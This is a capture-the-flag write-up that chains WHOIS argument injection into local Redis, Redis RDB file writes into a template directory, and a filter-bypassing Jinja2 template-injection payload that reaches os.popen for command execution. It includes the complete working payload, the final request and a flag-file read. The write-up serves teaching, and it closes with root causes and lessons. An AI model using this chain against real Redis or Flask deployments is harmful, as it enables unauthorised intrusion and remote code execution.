# Whois Gallery: Redis Argument Injection to Remote Code Execution

**Category:** Web / SSRF / SSTI
**Flag:** `NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_4cf1d78cd52e4ef18866ef4b788c598a}`

## TL;DR

The challenge exposes a WHOIS lookup tool that caches results in Redis. The
"domain" input is actually passed as raw arguments to a `whois`-style client,
which lets us inject `-h` and `-p` flags to redirect the connection to
`127.0.0.1:6379`: the app's own Redis instance, and smuggle raw Redis
protocol commands through what looks like a WHOIS query.

From there, the chain is:

1. **Argument injection** into the WHOIS client to reach local Redis.
2. **File write via RDB dump** (`CONFIG SET dir/dbfilename` + `SAVE`) to drop
   a malicious file into the application's template directory.
3. **Server-Side Template Injection (SSTI)** in an unsandboxed Jinja2
   environment, discovered via a second endpoint (`/render`) that reads and
   renders `.tpl` files.
4. **Filter bypass** for a strict input jail (blocking `_`, `'`, `"`, `[`,
   `]`, `=`, and several keywords) by pushing all sensitive strings out of
   the filtered input and into the unfiltered `/render` query string via
   Jinja's built-in `request` object.
5. **RCE** by walking Python's class hierarchy (`__class__.__base__.__subclasses__()`)
   to reach `subprocess.Popen`, then pivoting through its `__init__.__globals__`
   to get the `os` module and call `os.popen(cmd).read()`.

---

## 1. Recon: the WHOIS form is an argument injection

The app's only visible feature is a "Domain" lookup box that runs a WHOIS
query and caches the result in Redis, per a hint on the page itself:

> *"Repeated normal lookups may be served from Redis cache."*

Testing the input revealed it isn't sanitized as a domain name at all: it's
passed close to verbatim as CLI arguments to a WHOIS client. That client
supports `-h <host>` and `-p <port>` flags to choose which WHOIS server to
query. Since WHOIS is a dead-simple plaintext protocol (send a line, get a
line back), we can point `-h`/`-p` at *any* TCP service that tolerates
arbitrary input on connect: including Redis.

**Test:**
```
-h 127.0.0.1 -p 6379 info
```

**Result:** a full Redis `INFO` response (CPU stats, replication info,
modules, keyspace, etc.) came back as the "WHOIS" result. This confirmed:

- The Redis instance is reachable on localhost.
- No authentication is required.
- Arbitrary Redis commands can be sent by simply typing them after the
  `-h`/`-p` flags.
- No Redis modules are loaded, and clustering is disabled: ruling out
  `MODULE LOAD`-based code execution up front.

## 2. Mapping the Redis foothold

A few safe, read-only commands established the boundaries before touching
anything destructive:

| Command | Result |
|---|---|
| `CONFIG GET dir` | `/app/db` |
| `CONFIG GET dbfilename` | `dump.rdb` |

Testing more invasive primitives showed:

- `SAVE` / `BGSAVE` work: Redis will happily dump its dataset to disk at
  `dir/dbfilename`.
- `DEBUG` is disabled.
- Lua scripting (`EVAL`) is blocked by an input filter (more on the filter
  below).
- `SHUTDOWN NOSAVE` was accidentally triggered once via careless testing: Redis restarted cleanly and came back online, a useful reminder that this
  injection point has real, sometimes irreversible, side effects.

This left **file write via RDB dump** as the most promising path: point
`dir` somewhere useful, set `dbfilename` to something with a meaningful
extension, stuff a Redis key with attacker-controlled content, and `SAVE` to
drop that content on disk.

## 3. Finding a file-read primitive: the `/render` endpoint

Browsing the target manually turned up a second endpoint in the About page:

```
GET /render?tpl=<name>
```

Requesting `/render?tpl=aeo` (an arbitrary name) returned:

```
template not found: /app/tpl/aeo.tpl
```

This tells us two things immediately:

- The app resolves `tpl` directly into a file path: `/app/tpl/<name>.tpl`.
- There's a template engine reading and rendering files from that directory.

Combined with the Redis foothold, the plan became clear: use Redis's RDB
dump to **write** a `.tpl` file into `/app/tpl/`, then use `/render` to
**read/execute** it.

## 4. Writing a file through Redis

```
CONFIG SET dir /app/tpl
CONFIG SET dbfilename pwn.tpl
SET x <payload>
SAVE
```

Requesting `/render?tpl=pwn` afterward returned the raw RDB file, header
bytes and all:

```
REDIS0009 redis-ver6.2.22 redis-bits ... payloadhere ...
```

Two important takeaways:

- The RDB binary framing (magic bytes, length prefixes, checksums) survives
  around our payload as **inert bytes**: the template engine doesn't
  choke on non-UTF8/binary garbage, it just prints it as literal text.
- Our injected string came through completely intact, meaning the template
  engine is tolerant enough for this write-primitive to work reliably.

## 5. Confirming SSTI

With arbitrary (mostly) intact content landing in a rendered template, the
natural next test is a classic SSTI fingerprint:

```
SET x {{7*7}}
SAVE
```

`/render?tpl=pwn` returned `49` in place of `{{7*7}}`: confirming:

- The template engine is **Jinja2** (or Jinja2-compatible syntax).
- Expressions are actually evaluated, not just echoed: this is a genuine
  SSTI vulnerability, not just a file-read bug.

## 6. Hitting the input jail

The Domain field itself turned out to have its own dedicated filter,
separate from anything Redis does. Attempts to build a standard SSTI RCE
chain ran straight into it:

| Input attempted | Jail response |
|---|---|
| `{{ _ }}` | `forbidden symbol '_'` |
| `{{ '...' }}` | `forbidden symbol` (quotes blocked, both `'` and `"`) |
| `...class...` | `forbidden token 'class'` |
| `...[...]...` | `forbidden symbol '['` |
| `...=...` | `forbidden symbol '='` |
| `...popen...` / `...read...` | `forbidden token` (keyword blocklist) |

This rules out every "textbook" Jinja2 SSTI payload, since they all lean on:
- Dunder attribute names (`__class__`, `__mro__`, `__subclasses__`, `__globals__`)
- String literals (to name those attributes via `attr()`)
- List/dict indexing syntax (`[...]`)
- Keyword arguments (`shell=True`, `stdout=-1`)

None of that syntax can survive being typed into the Domain field.

## 7. The bypass: smuggle strings through `request.args`

The key realization: **Jinja2 exposes Flask's `request` object by default**
in the template context. Testing:

```
SET x {{request}}
```

returned:

```
<Request 'http://.../render?tpl=pwn' [GET]>
```

`request` is live and unrestricted. This matters because `request.args` lets
us pull arbitrary strings **from the URL query string of the `/render`
request itself**: a completely different input channel than the filtered
Domain field. The filter only inspects what we type into the WHOIS box; it
has no visibility into, or control over, the `/render?...` URL we later
type into the browser.

This flips the whole approach:

- The **template we write via Redis** only ever needs to reference generic,
  meaningless placeholder names (`o`, `a`, `b`, `g`, `i`, `p`, `r`, ...): none of which trip the keyword filter.
- The **actual sensitive strings** (`__class__`, `__subclasses__`, `os`,
  `popen`, `read`, shell commands) live entirely in the browser's address
  bar when hitting `/render`, which the jail never sees.

We also swap Jinja's `.attr` syntax for **`|attr(...)`**, since the `attr()`
filter takes its argument as an *expression* rather than requiring a
hardcoded string literal, so attribute names can come from `request.args`
without ever needing quotes.

## 8. Building the RCE chain, one hop at a time

### Step 1: walk the class hierarchy

```
{{request.args.o|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()}}
```

Called with:
```
?o=hi&a=__class__&b=__base__&c=__subclasses__
```

This is the standard SSTI subclasses-walk (`''.__class__.__base__.__subclasses__()`),
just rewritten so every dunder name arrives via `request.args` instead of
being typed literally. It returned the **full list of loaded Python
classes**: several hundred entries, including, notably:

```
<class 'subprocess.Popen'>
```

### Step 2: index into the list

Rather than filter the list dynamically (which would need `selectattr` and
more banned syntax), we counted `subprocess.Popen`'s position directly from
the dump: **index 399**.

Indexing without bracket syntax uses the same `attr()` trick, this time
reaching `list.__getitem__`:

```
{{...__subclasses__()|attr(request.args.g)(request.args.i|int)}}
```
```
?g=__getitem__&i=399
```

This isolated `<class 'subprocess.Popen'>` cleanly.

### Step 3: pivot to the `os` module via `__globals__`

`Popen` itself can't be called without keyword arguments (`shell=True`,
`stdout=-1`), and `=` is banned outright: no keyword-argument syntax is
possible at all. Instead of instantiating `Popen`, we use it purely as a
**stepping stone**: every function object carries a `__globals__` dict
containing the module-level names visible to it at definition time,
including imported modules.

```
{{...__getitem__(399)|attr(request.args.init)|attr(request.args.gl)|attr(request.args.g)(request.args.osname)}}
```
```
&init=__init__&gl=__globals__&osname=os
```

`Popen.__init__.__globals__['os']`: reached via chained `attr()`/`__getitem__`
calls instead of literal dict-subscript syntax: hands us the live `os`
module object.

### Step 4: execute and read output

`os.popen(cmd)` takes a single positional string and needs no keyword
arguments at all, sidestepping the `=` ban completely:

```
{{...|attr(request.args.p)(request.args.cmd)|attr(request.args.r)()}}
```
```
&p=popen&cmd=id&r=read
```

**Final template** (written once via Redis, never changes):
```jinja2
{{request.args.o
  |attr(request.args.a)
  |attr(request.args.b)
  |attr(request.args.c)()
  |attr(request.args.g)(request.args.i|int)
  |attr(request.args.init)
  |attr(request.args.gl)
  |attr(request.args.g)(request.args.osname)
  |attr(request.args.p)(request.args.cmd)
  |attr(request.args.r)()}}
```

**Final request:**
```
/render?tpl=pwn&o=hi&a=__class__&b=__base__&c=__subclasses__
  &g=__getitem__&i=399&init=__init__&gl=__globals__&osname=os
  &p=popen&cmd=id&r=read
```

**Response:**
```
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

Arbitrary command execution, confirmed.

## 9. Capturing the flag

Swapping `cmd=id` for a file read:

```
&cmd=cat /flag.txt
```

returned:

```
NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_4cf1d78cd52e4ef18866ef4b788c598a}
```

---

## Root causes

1. **Argument injection**: the WHOIS "domain" field passed user input
   directly into a command-line argument context, allowing `-h`/`-p`
   redirection to an internal service.
2. **No network segmentation / auth on Redis**: the app's Redis instance
   was reachable and unauthenticated from the same host running the web
   app, letting an SSRF-style bug reach a stateful, file-writing service.
3. **Untrusted file write into a template directory**: Redis's own
   `CONFIG SET dir/dbfilename` + `SAVE` primitive should never point at a
   directory the application treats as executable/renderable content.
4. **Unsandboxed Jinja2**: using `jinja2.Template` (or an equivalent
   non-sandboxed renderer) on file content that could be influenced by an
   attacker turned a file-write bug into full RCE.
5. **Blocklist-based input filtering is bypassable by design**: filtering
   specific characters/keywords in one input channel (the Domain field)
   provided no protection once a second, unfiltered input channel
   (`request.args` on a different endpoint) fed the same interpreter.

## Key lessons

- **Multi-layered filters must be evaluated together, not independently.**
  Bypassing the character filter didn't help until the keyword filter was
  also accounted for, and vice versa.
- **A filtered input channel is not a filtered *application*.** Once
  `request` was reachable inside the template, the entire character/keyword
  jail on the Domain field became irrelevant to the actual exploit payload.
- **SSTI doesn't need string literals to be dangerous.** Every "banned"
  string (`__class__`, `os`, `popen`, shell commands) was reconstructed
  using only attribute chaining and an unrelated, unfiltered data source: no `chr()`, no quotes, no brackets, no `=` were ever required in the
  final working exploit.
